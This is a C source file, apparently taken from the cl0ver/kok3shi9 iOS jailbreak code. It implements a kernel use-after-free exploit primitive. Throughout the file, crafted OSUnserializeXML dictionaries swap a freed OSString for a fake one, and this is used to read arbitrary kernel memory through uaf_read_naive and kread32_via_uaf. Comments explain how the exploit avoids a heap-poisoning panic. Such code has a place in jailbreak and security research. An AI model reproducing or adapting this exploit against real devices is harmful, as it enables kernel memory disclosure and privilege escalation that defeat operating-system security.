// siguza's cl0ver
// this file was also used kok3shi9

#include <errno.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
    
#include <mach/vm_prot.h>

#include <common.h>
#include <io.h>
#include <kslide.h>
#include <plog.h>
#include <offsets.h>
#include <uaf.h>


void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
{
    DEVLOG("using UAF to read kernel bytes...");
    const uint32_t *data = (const uint32_t*)fake;
    
    uint32_t buflen = (uint32_t)len;
    const char str[] = "str";
    const char ref[] = "ref";
    const char sav[] = "sav";
    
    {
        uint32_t dict[] =
        {
            kOSSerializeMagic,                                              // Magic
            kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries
            
            kOSSerializeSymbol  | 4,                                        // Whatever name
            *((uint32_t*)str),
            kOSSerializeString  | 4,                                        // String that will get freed
            *((uint32_t*)str),
            
            kOSSerializeObject  | 1,                                        // Same name
            kOSSerializeBoolean | 1,                                        // Lightweight value
            
            kOSSerializeObject  | 1,                                        // Same name again
            kOSSerializeData    | sizeof(OSString),                         // OSData with same size as OSString

            /* !__LP64__ */
            data[0],                                                        // vtable pointer
            data[1],                                                        // retainCount
            data[2],                                                        // flags
            data[3],                                                        // length
            data[4],                                                        // string pointer
            /* !__LP64__ */
            
            kOSSerializeSymbol | 4,                                         // Name that we're gonna use to retrieve bytes
            *((uint32_t*)ref),
            kOSSerializeObject | 2,                                         // Reference to the overwritten OSString
            
            kOSSerializeSymbol | 4,                                         // Create a reference to the OSData to prevent it
            *((uint32_t*)sav),                                              // from being freed before the OSString, which
            kOSSerializeEndCollection | kOSSerializeObject | 4,             // would cause a panic (because heap poisoning).
        };
        
        dict_get_bytes(dict, sizeof(dict), ref, buf, &buflen);
    }
}

void uaf_read_naive(const char *addr, char *buf, size_t len)
{
    DEVLOG("dumping kernel bytes " ADDR "-" ADDR "...", (addr_t)addr, (addr_t)(addr + len));
    
    OSString osstr =
    {
        .vtab = (vtab_t)off_vtab(),                     // actual OSString vtable
        .retainCount = 100,                             // don't try to free this
        .flags = kOSStringNoCopy,                       // and neither the "string" it points to
    };
    
    for(size_t off = 0; off < len; off += osstr.length)
    {
        osstr.length = len - off;
        osstr.length = osstr.length > MIG_MSG_SIZE ? MIG_MSG_SIZE : osstr.length;
        osstr.string = &addr[off];
        uaf_get_bytes(&osstr, &buf[off], osstr.length);
    }
}

addr_t kread32_via_uaf(addr_t addr)
{
    const char *base = (const char *)addr;
    char val[4];
    
    uaf_read_naive(base, val, 4);
    
    uint32_t* ret = (uint32_t *)val;
    return ret[0];
}
